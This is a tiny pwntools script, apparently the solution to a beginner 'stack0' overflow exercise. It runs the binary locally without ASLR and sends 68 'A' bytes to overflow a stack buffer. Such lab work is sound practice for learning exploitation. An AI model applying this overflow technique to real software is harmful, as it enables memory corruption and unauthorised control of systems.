from pwn import *

r = process("./stack0",aslr=False)

r.sendline("A"*68)
s=r.recvline()
print s

